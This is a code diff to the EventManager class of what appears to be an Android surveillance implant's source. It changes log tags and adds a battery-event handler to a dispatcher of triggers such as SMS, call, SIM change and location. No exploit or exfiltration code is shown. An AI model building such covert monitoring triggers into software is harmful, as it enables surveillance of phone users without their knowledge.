@@ -21,7 +21,6 @@ import com.ht.RCSAndroidGUI.utils.Check;
  * The Class EventManager.
  */
 public class EventManager extends Manager {
-
 	/** The Constant TAG. */
 	private static final String TAG = "EventManager";
 
@@ -45,7 +44,6 @@ public class EventManager extends Manager {
 		return singleton;
 	}
 
-
 	/**
 	 * mapAgent() Add agent id defined by "key" into the running map. If the
 	 * agent is already present, the old object is returned.
@@ -63,56 +61,57 @@ public class EventManager extends Manager {
 
 		switch (key) {
 		case EventConf.EVENT_TIMER:
-			Log.d(TAG,"Info: " + "");
+			Log.d("QZ", TAG + "Info: " + "");
 			e = new TimerEvent();
 			break;
 
 		case EventConf.EVENT_SMS:
-			Log.d(TAG,"Info: " + "EVENT_SMS");
+			Log.d("QZ", TAG + "Info: " + "EVENT_SMS");
 			break;
 
 		case EventConf.EVENT_CALL:
-			Log.d(TAG,"Info: " + "EVENT_CALL");
+			Log.d("QZ", TAG + "Info: " + "EVENT_CALL");
 			break;
 
 		case EventConf.EVENT_CONNECTION:
-			Log.d(TAG,"Info: " + "EVENT_CONNECTION");
+			Log.d("QZ", TAG + "Info: " + "EVENT_CONNECTION");
 			break;
 
 		case EventConf.EVENT_PROCESS:
-			Log.d(TAG,"Info: " + "EVENT_PROCESS");
+			Log.d("QZ", TAG + "Info: " + "EVENT_PROCESS");
 			break;
 
 		case EventConf.EVENT_CELLID:
-			Log.d(TAG,"Info: " + "EVENT_CELLID");
+			Log.d("QZ", TAG + "Info: " + "EVENT_CELLID");
 			break;
 
 		case EventConf.EVENT_QUOTA:
-			Log.d(TAG,"Info: " + "EVENT_QUOTA");
+			Log.d("QZ", TAG + "Info: " + "EVENT_QUOTA");
 			break;
 
 		case EventConf.EVENT_SIM_CHANGE:
-			Log.d(TAG,"Info: " + "EVENT_SIM_CHANGE");
+			Log.d("QZ", TAG + "Info: " + "EVENT_SIM_CHANGE");
 			break;
 
 		case EventConf.EVENT_LOCATION:
-			Log.d(TAG,"Info: " + "EVENT_LOCATION");
+			Log.d("QZ", TAG + "Info: " + "EVENT_LOCATION");
 			break;
 
 		case EventConf.EVENT_AC:
-			Log.d(TAG,"Info: " + "EVENT_AC");
+			Log.d("QZ", TAG + "Info: " + "EVENT_AC");
 			break;
 
 		case EventConf.EVENT_BATTERY:
-			Log.d(TAG,"Info: " + "EVENT_BATTERY");
+			Log.d("QZ", TAG + "Info: " + "EVENT_BATTERY");
+			e = new BatteryEvent();
 			break;
 
 		case EventConf.EVENT_STANDBY:
-			Log.d(TAG,"Info: " + "EVENT_STANDBY");
+			Log.d("QZ", TAG + "Info: " + "EVENT_STANDBY");
 			break;
 
 		default:
-			Log.d(TAG,"Error: " + "Unknown: " + key);
+			Log.d("QZ", TAG + "Error: " + "Unknown: " + key);
 			break;
 		}
 
@@ -134,12 +133,12 @@ public class EventManager extends Manager {
 		events = status.getEventsMap();
 
 		if (events == null) {
-			Log.d(TAG, "Events map null");
+			Log.d("QZ", TAG + "Events map null");
 			return false;
 		}
 
 		if (running == null) {
-			Log.d(TAG, "Running Events map null");
+			Log.d("QZ", TAG + "Running Events map null");
 			return false;
 		}
 
@@ -151,15 +150,15 @@ public class EventManager extends Manager {
 			final EventBase e = factory(key);
 
 			if (e != null) {
-
 				e.parse(pairs.getValue());
+				
 				if (e.getStatus() != EventConf.EVENT_RUNNING) {
 					final Thread t = new Thread(e);
+					
 					t.start();
 					threads.put(e, t);
-
 				} else {
-					Log.d(TAG,"Warn: " + "event already running");
+					Log.d("QZ", TAG + "Warn: event already running");
 				}
 			}
 		}
@@ -182,6 +181,7 @@ public class EventManager extends Manager {
 
 			if (event.getStatus() == EventConf.EVENT_RUNNING) {
 				event.stopThread();
+				
 				try {
 					final Thread t = (Thread) threads.get(event);
 					Check.asserts(t != null, "Null thread");
